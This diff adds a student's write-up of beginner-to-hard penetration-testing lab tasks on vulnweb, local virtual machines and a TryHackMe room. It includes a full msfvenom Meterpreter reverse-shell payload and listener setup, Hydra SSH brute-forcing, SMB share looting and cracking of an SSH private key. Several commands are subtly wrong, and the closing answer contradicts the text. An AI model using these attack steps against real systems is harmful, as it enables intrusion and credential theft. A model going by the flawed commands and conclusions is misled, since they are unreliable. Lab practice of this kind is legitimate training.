@@ -1,0 +1,334 @@
+Beginner
+
+1) Find all the ports that are open on the website http://testphp.vulnweb.com/
+
+1. I started by visiting the given website to get a basic understanding of its structure and ensure that it was accessible and responsive.
+2. I then booted into my Parrot Security OS virtual machine, which offers built-in penetration testing and network analysis tools.
+3. To initiate the reconnaissance process, I attempted to ping the website using the command:
+ping testphp.vulnweb.com
+This helped confirm the website’s availability and resolved its domain name to an IP address.
+4. After receiving a successful response, I extracted the website's IP address, which in this case was 44.228.249.3.
+5. With the IP address in hand, I proceeded to use Nmap — a powerful network scanning tool commonly used for port scanning and security auditing.
+6. I executed the following Nmap command:
+nmap -sT -Pn 44.228.249.3
+Where, -sT option performs a TCP connect scan, which checks for open TCP ports by completing the full handshake, the -Pn flag was used to skip host discovery, assuming the host is online, which is useful in cases where ICMP (ping) responses might be blocked.
+7. Upon execution, Nmap scanned the target IP and displayed the results. The output indicated that only port 80 (HTTP) was open on the host, suggesting that the web service was running on that port and no other common services were exposed.
+8. Based on these findings, I confirmed that the task was completed, having identified the open port and validated the website’s network exposure.
+
+2) Brute force the website http://testphp.vulnweb.com/ and find the directories that are present on the website.
+
+1. To begin the task, I selected Dirb, a command-line-based web content scanner designed specifically for brute-force directory enumeration. It helps identify hidden or non-linked directories by attempting access using common directory names.
+2. I used a Parrot Security OS virtual machine for this task, as it comes pre-equipped with Dirb and other essential penetration testing tools.
+3. After launching the terminal with root privileges, I prepared to run Dirb against the target URL.
+4. I executed the following command to initiate the scan:
+sudo dirb http://testphp.vulnweb.com/
+This command used the tool’s default wordlist, which contains a list of commonly used directory names. Dirb attempted to access each one against the target URL.
+5. The scan output displayed a list of directories that exist and are accessible on the server. Some of these included common paths like /admin/, /images/, and /uploads/ (actual output may vary).
+6. To better understand the context of these directories, I manually visited the discovered paths in a browser to observe their content and behavior.
+7. Additionally, I performed basic research on some of the directory names to understand what kind of resources or functionalities they might contain in typical web applications.
+8. Based on the successful discovery of accessible directories and verification of their existence, I concluded this task as complete.
+
+3) Make a login to the website http://testphp.vulnweb.com/ and intercept the network traffic using Wireshark and find the credentials that were transferred through the network.
+
+1. To capture login credentials transmitted over the network, I used Wireshark, a powerful network protocol analyzer (also known as a packet sniffer) capable of monitoring and inspecting live network traffic.
+2. I navigated to the target website:
+http://testphp.vulnweb.com/
+3. On the homepage, I located and clicked the "Signup" hyperlink, followed by the "Signup Here" option to register a new user.
+4. The registration form was displayed, and I filled in the required fields with randomly generated characters for both the username and password. I then submitted the form by clicking the "Signup" button.
+5. After successfully registering, I clicked on the "Your Profile" hyperlink to access the login page.
+6. Before entering the login credentials, I opened Wireshark with root privileges to ensure full access to network interfaces. I selected the active interface (eth0) to begin capturing live network traffic.
+7. Once the packet capture started, I returned to the login page and entered the same credentials I had just registered. I then clicked the "Login" button.
+8. During this login attempt, Wireshark actively captured all the network traffic, including HTTP packets potentially containing sensitive data.
+9. I returned to Wireshark to begin the analysis of the captured data. To filter the traffic and search for potential credential leakage, I clicked on the “Analyze” menu and used the “Find Packet” feature.
+10. In the Find Packet window, I configured the following options to narrow down the search:
+Selected "Packet Details" as the search field.
+Choose "Narrow (UTF-8/ASCII)" as the character encoding.
+Set the search type to "String".
+11. In the search box, I experimented with various keyword strings such as "password", "passwd", and "pass". Among these, the term "pass" yielded results.
+12. Using this filter, I successfully located the login credentials being transmitted in plain text within the captured packets. The captured data included both the username and password, clearly visible in the packet details.
+13. The presence of unencrypted login data confirmed a security vulnerability in the website, and this completed the task successfully.
+
+
+
+Intermediate
+
+1) A file is encrypted using Veracrypt (A disk encryption tool). The password to access the file is encrypted in a hash format and provided to you in the drive with the name encoded.txt. Decode the password and enter it in the vera crypt to unlock the file and find the secret code in it. The veracrypt setup file will be provided to you.
+
+1. To begin, I downloaded all the necessary files provided in the Task File. These files were in a zipped format, which I unzipped and extracted. The extracted folder contained two .exe application files and two text files.
+2. I started by reviewing the contents of the folder, ensuring that all files were in place, and then proceeded with the task.
+3. As per the task instructions, I installed the VeraCrypt Setup 1.26.7.exe, a disk encryption software used to encrypt and mount the encrypted file shadowfox veracrypt.txt.
+4. Once the installation was successful, I familiarized myself with the user interface (UI) and functionality of the VeraCrypt application to understand its workflow for mounting encrypted drives.
+5. After understanding the application’s workflow, I chose a random drive letter for mounting the encrypted file — in this case, I selected drive "P". I then clicked on the “Select File” button to choose the encrypted file from the folder.
+6. Upon selecting the file, I clicked the “Mount” button. A prompt appeared asking for the password to unlock the encrypted file. I then noticed a text file named encoded.txt in the folder, which contained the password in a hashed format.
+7. To decode the password, I searched online for a hash-to-plaintext converter. I visited the website [CrackStation.net](https://crackstation.net/), a trusted tool for decoding hashed text into its original form.
+8. I entered the hashed password from the encoded.txt file into the hash converter on the website. The tool successfully decoded the password, revealing the plaintext password: "password123".
+9. I returned to the VeraCrypt application, selected the same “P” drive, and clicked on “Select File” again to load the encrypted file from the extracted folder. I clicked “Mount” once more.
+10. When prompted for the password, I entered the plaintext password "password123" that I obtained from the hash conversion. After entering the correct password, I noticed that the file was successfully mounted.
+11. I opened the File Explorer on my virtual machine and navigated to This PC. A new drive labeled "P" appeared, indicating that the VeraCrypt tool had successfully mounted the encrypted file.
+12. After opening the newly created P: drive, I found a file named "shadowfox cybersecurity". This file was the result of mounting the encrypted file.
+13. Inside the mounted file, I discovered the secret code, which was "never give up".
+14. This concluded the task, where I successfully decoded the hashed password, mounted the encrypted file using VeraCrypt, and retrieved the secret code, completing the task successfully.
+
+2) An executable file of veracrypt will be provided to you. Find the address of the entry point of the executable using the PE explorer tool and provide the value as the answer as a screenshot.
+
+1. Following the completion of previous tasks, where I successfully downloaded a zipped folder from Google Drive, extracted the files, and completed the decryption process, I already had all the necessary files saved on my virtual machine system.
+2. For this task, I required two key components:
+The VeraCrypt Setup 1.26.7.exe file, which I had previously downloaded was intended for further analysis.
+The PE Explorer tool (PE.Explorer_setup.exe), would be used to examine the VeraCrypt executable and extract the address of the entry point.
+3. To begin, I installed the PE Explorer tool on my virtual machine. This tool is widely used for inspecting and analyzing Windows executable files in Portable Executable (PE) format, such as .exe files.
+4. Once the installation was complete, I launched the PE Explorer tool and began by navigating to the File menu, located at the top-left corner of the application.
+5. In the File menu, I selected the VeraCrypt Setup 1.26.7.exe executable file and opened it within the PE Explorer tool. The application then analyzed the executable file and extracted relevant details about its structure.
+6. After the file was loaded, the PE Explorer tool displayed comprehensive information about the executable, including the address of the entry point. I located the address in the displayed output, as shown in the screenshot below.
+7. The task was successfully completed after extracting the entry point address, which was captured and saved in the provided screenshot.
+
+3) Create a payload using Metasploit and make a reverse shell connection from a Windows 10 machine in your virtual machine setup.
+
+1. For the completion of this task, I used two virtual machines:
+Attacker Machine: Running Parrot OS with IP address 192.168.101.136.
+Victim Machine: Running Windows 10 OS with IP address 192.168.101.130.
+2. I began by creating the payload on the attacker machine. To do this, I opened the terminal on Parrot OS with root privileges.
+3. Since my target machine is running Windows OS, I chose to create a .exe file as the payload. I used the msfvenom tool to generate the reverse TCP payload with the following command:
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.101.136 LPORT=444 -o Inter_Task3.exe
+This command generated a reverse_tcp payload that connects back to the attacker's machine at IP 192.168.101.136 and port 444.
+4. After successfully creating the payload, I verified the file was created by listing the files in the directory, ensuring Inter_Task3.exe was present.
+5. Next, as the attacker, I needed to send the created payload to the victim machine. To simplify this process, I used Python3 to serve the current working directory over HTTP, which allows the victim machine to download the payload file. I ran the following command in the attacker machine's terminal:
+python3 -m http.server
+6. Using the HTTP server, I accessed the attacker's machine from the victim machine's browser by visiting the following URL:
+http://192.168.101.136:8000
+This allowed the victim to browse and download the Inter_Task3.exe payload file.
+7. On the victim machine, I disabled the firewall and real-time antivirus protections to avoid blocking the file download. Additionally, Google Chrome's default security settings flagged the file, but I bypassed the warning by selecting the "Show Details" option and clicking "Run Anyway".
+8. After successfully downloading the executable, I switched back to the attacker machine to set up the listener, which would handle the incoming reverse shell connection when the victim ran the payload.
+9. On the attacker machine, I opened a new terminal window with root privileges and launched the msfconsole tool by running:
+msfconsole -q
+10. In the msfconsole, I configured the listener by first using the exploit/multi/handler module to handle the reverse shell:
+use exploit/multi/handler
+11. I then set the payload to match the one used to create the executable:
+set payload windows/meterpreter/reverse_tcp
+12. Next, I configured the listener's LHOST and LPORT to match the settings used when generating the payload:
+set LHOST 192.168.101.136
+set LPORT 444
+13. I ran the command to verify the configuration:
+show options
+14. After confirming the settings were correct, I ran the following command to initiate the listener:
+run -j
+15. With the listener running, I moved to the victim machine (Windows 10) and executed the downloaded Inter_Task3.exe payload. Despite a security warning from Windows Antivirus, I clicked "Run Anyway" to continue the execution.
+16. Although the victim's machine showed no visible output after running the payload, the attacker's machine confirmed a successful reverse shell connection. From the attacker's perspective, the reverse shell session was successfully established.
+17. Back on the attacker machine, I verified the reverse shell session by running the following command:
+sessions -i
+This confirmed that the victim's machine was successfully compromised and the session was active.
+18. I then interacted with the session by running:
+session -i 1
+This command connected to the first session (as only one session was active).
+19. After gaining access to the victim's machine, I ran several basic commands to confirm control. For example, I ran the "sysinfo" command to gather system information from the victim's machine.
+20. Finally, I used the "shell" command to obtain access to the Windows Command Prompt on the victim's machine, fully gaining control of the system.
+21. This process successfully demonstrated the exploitation and establishment of a reverse shell connection from the victim machine using Metasploit, msfvenom, and msfconsole.
+
+
+
+
+
+Hard
+
+2) Using the Tryhackme platform, launch the Basic Pentesting room. Penetrate the room and answer all the questions that are given to you on the website and also create a detailed document of the process of penetration and how you did it.
+
+NOTE: I used Parrot OS (my personal setup) instead of the machine provided by TryHackMe.
+
+A) Deploy the machine and connect to our network
+
+1. I started by navigating to the TryHackMe website and logging into my existing account.
+2. After logging in, I went to the Home Dashboard and clicked the Search icon at the top-right corner of the page.
+3. I searched for "Basic Pentesting Room" and selected the third result, which was the Basic Pentesting Room.
+4. I clicked on the room and then clicked on the "Access Machine" button to start the machine deployment process.
+5. I clicked on the "Start Attackbox" to access the machine and begin the process.
+6. On the page, I clicked on the OpenVPN configuration file link to download the VPN configuration file required to connect to TryHackMe's network.
+7. I selected the "IN-Regular-1" VPN Server to download the file.
+8. I then clicked on "OpenVPN (Advanced)", which is the free option for accessing the lab, and followed the instructions provided on the page.
+9. I downloaded and installed OpenVPN GUI by following the video tutorial and selecting the "Windows 64-bit MSI installer" from the OpenVPN website.
+10. After installing, I clicked on the upward arrow (^) in the taskbar to reveal hidden icons, then right-clicked the OpenVPN icon to manage the connection.
+11. I imported the downloaded OpenVPN profile by selecting "Import", then "Import file" and navigating to the configuration file I downloaded earlier.
+12. I right-clicked the OpenVPN icon again and clicked "Connect" to establish a connection with TryHackMe's network.
+13. Once connected, I successfully deployed the machine in the Basic Pentesting Room and was ready to begin the penetration testing process.
+Note: No answers were required to be input into the TryHackMe answer box for this part of the task.
+
+B) Find the services exposed by the machine
+
+1. After deploying the machine and connecting to the TryHackMe network, I proceeded with the task of finding the open services (i.e., open ports) on the machine.
+2. To find the IP address of the machine I was accessing, I had two options:
+    a. First, the IP address was displayed at the top middle of my machine.
+    b. Second, I ran the following command to get the IP address: ifconfig
+3. To identify the open services and ports on the machine, I used Nmap, a versatile tool for network exploration and security auditing. I ran the following command:
+sudo nmap -sT 10.10.69.18
+(Note: The IP address changes based on the session).
+4. This command allowed me to successfully find all the open services/ports on the machine, completing the task.
+Note: No answer was required to be input into the TryHackMe answer box for this part of the task.
+
+C) What is the name of the hidden directory on the web server(enter name without /)?
+
+1. To exploit and find the hidden directory on the web server, I used two tools:
+    a. Dirbuster (a GUI tool)
+    b. Gobuster (a command-line tool).
+2. In this task, I’ll detail the steps using Gobuster.
+3. I ran the following command using root privileges on the terminal:
+sudo gobuster dir -u 10.10.69.18 -w /usr/share/wordlist/dirbuster/directory-list-lowercase-2.3-medium.txt --exclude 472
+where, sudo: Runs the command with root privileges.
+gobuster: Initializes the Gobuster tool.
+dir: Tells Gobuster to search for directories.
+-u IP_Address: Specifies the IP address of the target machine.
+-w wordlist: Specifies the wordlist containing common directory names to search for.
+--exclude 472: Excludes status code 472 to avoid errors during the scan.
+4. After running the command, the first result displayed was /development, and Gobuster began searching for directories within /development.
+5. As the scan was taking time to complete, I decided to submit the answer as "development" (without the slash and quotes), and it worked successfully.
+6. By submitting "development" as the hidden directory name, I successfully completed the task of exploiting the hidden directory on the web server using Gobuster.
+
+D) User brute-forcing to find the username & password
+E) What is the username?
+
+1. I used smbmap, a tool that allows users to enumerate SMB shares across an entire domain, for this task.
+2. To start, I ran the following command to scan SMB shares on the given IP and list available shares on the victim machine:
+smbmap -H 10.10.69.18
+-H specifies the host (IP address).
+3. To get a detailed view of the shares and files, I ran the command recursively:
+smbmap -H 10.10.69.18 -R
+-R is used for recursively listing files within the shares.
+4. This gave me a detailed listing of files. Two shares were available: Anonymous and IPC$.
+5. Under the Anonymous share, I found three files. Two were hidden, and one interesting file was staff.txt. I decided to investigate further.
+6. I initially tried accessing the file using file-reading tools like cat, nano, vi, and pluma, but it didn’t work.
+7. Next, I used smbclient to access the Anonymous share:
+smbclient \\\\10.10.69.18\\Anonymous
+8. I was prompted for a password, and I tried my Parrot OS root password, which successfully gave me access to the share.
+9. I then used the get command to copy staff.txt from the Anonymous share to my Parrot OS machine:
+get staff.txt
+10. I navigated to my Downloads folder and found staff.txt.
+11. I opened the file and found an announcement listing two usernames: Jan and Kay.
+12. I submitted "Jan" as the username in the TryHackMe question box and successfully completed the task.
+
+F) What is the password?
+
+1. I previously obtained two usernames (Jan and Kay) from the staff.txt file in the Anonymous share. The next task was to find the password for these users.
+2. For brute-forcing the password, I chose to use HYDRA, a parallelized network login cracker available in Linux-based OS.
+3. To begin, I checked the availability of the rockyou.txt wordlist on my system by listing files in the wordlist directory:
+ls /usr/share/wordlist/rockyou.txt
+4. After confirming that the wordlist is available, I copied it to my Downloads folder for easier access:
+cp /usr/share/wordlist/rockyou.txt /Downloads/
+5. I then initiated HYDRA to start the brute-force attack on the Jan username using the rockyou.txt wordlist:
+hydra -l jan -p Downloads/rockyou.txt ssh://10.10.69.18
+-l jan specifies the username.
+-p specifies the path to the password wordlist.
+ssh://IP_Address is the target system and the service (SSH in this case).
+6. The tool began trying all password combinations from the wordlist against the jan username via SSH.
+7. After a while, HYDRA found the correct password, "armando", for the jan username.
+8. I successfully brute-forced the password for Jan using HYDRA.
+
+G) What service do you use to access the server(answer in abbreviation in all caps)?
+
+1. To access the server, I first needed valid user credentials. I obtained the username (Jan) and password (armando) from previous tasks.
+2. From the earlier brute-forcing task, I identified SSH as the open, running service on the system.
+3. To access the server, I used the SSH service and ran the following command:
+ssh jan@10.10.69.18
+4. I was prompted to enter the password, which I provided as "armando" (the password I obtained earlier).
+5. By entering the correct credentials, I successfully accessed the server via SSH.
+6. Therefore, the service used to access the server is SSH.
+
+H) Enumerate the machine to find any vectors for privilege escalation
+
+1. I aimed to find potential privilege escalation vectors on the target machine using the LinEnum tool, which simplifies the process of identifying attack vectors.
+2. Initially, I tried downloading LinEnum directly onto the victim machine using the wget command, but faced issues.
+3. I switched to using git clone to download the tool from the repository:
+git clone https://github.com/rebootuser/LinEnum
+4. After cloning, I navigated to the downloaded folder and attempted to run the script with:
+cd /HOME/JAN/LinEnum
+chmod +x LinEnum.sh
+./LinEnum
+5. However, I found that the Jan user didn’t have the required privileges to run or install tools.
+6. I changed my approach and downloaded LinEnum onto my local Parrot OS machine and transferred it to the victim machine using scp.
+7. On my local machine, I ran the following commands:
+git clone https://github.com/rebootuser/LinEnum
+cd /home/atharva/LinEnum
+scp LinEnum.sh jan@10.10.69.18:/tmp
+8. I then switched to the SSH session and navigated to the /tmp folder on the victim machine:
+cd /home/jan/tmp
+chmod +x LinEnum.sh
+9. After making the script executable, I ran the LinEnum tool:
+./LinEnum
+10. The tool began gathering detailed system information, revealing possible vectors for privilege escalation.
+11. By using LinEnum, I successfully identified all vectors for privilege escalation on the target machine.
+
+I) What is the name of the other user you found(all lower case)?
+
+1. I started the task by using the tool smbmap, which helps in enumerating Samba shares across a network. I ran the following command to scan the SMB shares on the target machine:
+smbmap -H 10.10.69.18
+This command returned a list of shares available on the target machine.
+2. After getting the list of shares, I wanted to see the files inside those shares. To do this, I used the -R option to recursively list all the files and directories within the shares:
+smbmap -H 10.10.69.18 -R
+This showed two shares: Anonymous and IPC$. Under the Anonymous share, I found a file named staff.txt.
+3. I now wanted to access the Anonymous share and examine the staff.txt file. To do this, I used the smbclient tool, which allows me to interact with SMB shares. I ran the following command:
+smbclient \\\\10.10.69.18\\Anonymous
+The system prompted me for a password to access the share.
+4. I didn’t know the password at first, but I decided to try using my root password from my Parrot OS machine. Surprisingly, it worked, and I gained access to the Anonymous share.
+5. Once inside, I tried to read the staff.txt file using various text editors such as cat, nano, vi, and pluma, but none of these commands worked. This meant I needed another method to access the file.
+6. I then realized that the get command in smbclient would allow me to download the file from the share to my local machine. So, I ran the following command to download staff.txt:
+get staff.txt
+This successfully copied the file to my Downloads folder on my Parrot OS machine.
+7. I navigated to my Downloads folder and opened the staff.txt file. Inside, I found an announcement with two usernames listed: Jan and Kay.
+8. Since I had already used Jan for another task, I decided to focus on the other username, Kay. I entered kay (in all lowercase) as the answer to the TryHackMe question.
+9. I then submitted kay in the TryHackMe user interface question box. This successfully completed the task, as Kay was the second user I found.
+10. By completing this task, I was able to successfully enumerate the users listed in the staff.txt file. The username kay was the one I entered as the answer.
+11. This entire process involved using the smbmap and smbclient tools for enumerating and interacting with SMB shares, then downloading and analyzing the contents of the staff.txt file.
+12. In conclusion, the other user found in the staff.txt file was kay, and I successfully submitted this username in the TryHackMe interface, completing the task.
+
+J) If you have found another user, what can you do with this information?
+
+1. While investigating potential privilege escalation vectors under the jan user, I found that the kay user had several hidden folders. Based on my experience, hidden folders might contain important files or information that could help escalate privileges or gain unauthorized access.
+2. To explore the kay user’s home directory for hidden files and directories, I ran the following command:
+ls -a /home/kay
+This command listed all files, including hidden ones, along with their permissions.
+3. I ran this command while logged in as the jan user via SSH, as this was my current access level on the server.
+4. The output showed several hidden directories. Among these, the .ssh directory caught my attention, along with a file named pass.bak. I could not access pass.bak directly, but I decided to further explore the .ssh directory, as it contained files related to authentication.
+5. To investigate the files inside the .ssh directory, I ran the following command:
+ls /home/kay/.ssh
+This revealed three files: authorized_keys, id_rsa, and id_rsa.pub. These files appeared to be related to SSH keys and authentication, so I decided to focus on them to see if they could help in cracking the password or escalating privileges.
+6. I speculated that the id_rsa file contained the private key, which could potentially be used to authenticate as kay. To proceed, I used John the Ripper, a tool designed for cracking encrypted keys. The first step was converting the private key to a format compatible with John the Ripper.
+7. I copied the contents of the id_rsa file to a new file on my Parrot OS host machine. Then, I ran the following command to convert the private key into John the Ripper format:
+python3 /usr/share/john/ssh2john.py id_rsa > rsa_hash.txt
+8. However, I encountered an error during this step:
+Traceback (most recent call last):
+  File "/usr/share/john/ssh2john.py", line 193, in <module>
+    read_private_key(filename)
+  File "/usr/share/john/ssh2john.py", line 103, in read_private_key
+    data = base64.decodestring(data)
+AttributeError: module 'base64' has no attribute 'decodestring'
+This error occurred because the script used a deprecated method that was incompatible with Python 3.
+9. After researching the issue, I discovered that the base64.decodestring() method was removed in Python 3 and replaced with base64.b64decode(). To fix this, I used the pluma text editor to edit the ssh2john.py script. I replaced the deprecated method with the correct one:
+pluma /Downloads/id_rsa
+I then saved the file and closed the editor.
+10. After making the necessary changes, I reran the conversion command:
+python3 /usr/share/john/ssh2john.py id_rsa > rsa_hash.txt
+This time, there were no errors, and the conversion was successful.
+11. The next step was to use John the Ripper to crack the password by running the following command:
+john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+This command used the rockyou.txt wordlist to attempt to crack the password for the kay user.
+12. After some time, John the Ripper successfully cracked the password and returned the plaintext password for the kay user:
+beeswax
+13. With this information, I was able to access the kay user’s account, as I had successfully cracked the password using the private key and John the Ripper.
+14. In conclusion, by finding the hidden .ssh folder and using the private key file, I was able to crack the password for the kay user. This demonstrates how gaining access to another user's credentials and SSH-related files can be crucial in escalating privileges or accessing unauthorized accounts.
+
+K) What is the final password you obtain?
+
+1. After successfully exploiting the kay user’s password in the previous task, I attempted to SSH into the victim server using the kay user credentials to further explore the machine.
+2. To initiate the SSH session with the kay user, I ran the following command:
+ssh kay@10.10.159.12
+However, this command resulted in an error, preventing me from gaining access to the machine.
+3. I attempted to bypass the issue by specifying the id_rsa private key file directly in the SSH command, like this:
+ssh id_rsa kay@10.10.159.12
+Unfortunately, this resulted in another error because the ssh command could not resolve the hostname "id_rsa."
+4. Upon further research, I found that the correct syntax for specifying an identity file in ssh is by using the -i option. So, I modified the command to:
+ssh -i id_rsa kay@10.10.159.12
+5. After running the corrected command, the system prompted me for a password. I entered the password that I had previously cracked for the kay user: "beeswax".
+6. With the correct password, I was successfully logged into the server via SSH as the kay user.
+7. Once logged in, I ran the ls command to list the files in the current directory. The output showed only one file in the directory, which was named "pass.bak". This file seemed suspicious and worth investigating further.
+8. I decided to read the contents of pass.bak using the cat command. The cat command is commonly used to display the contents of text files if the user has appropriate read permissions. I ran the following command:
+cat pass.bak
+9. To my surprise, the pass.bak file was not encrypted or password-protected. The kay user had read access to the file, and when I displayed its contents, it directly showed a long string in plain text. I copied this string.
+10. I pasted the string into the TryHackMe platform’s question box for this task, where it successfully worked, allowing me to complete the task.
+11. With this, I successfully obtained the final password for the kay user, which was "beeswax".
+12. This completed the final step of the Basic Pentesting Room tasks on TryHackMe, marking my full exploitation process with a 100% completion status, as seen in the final proof of completion (POC).
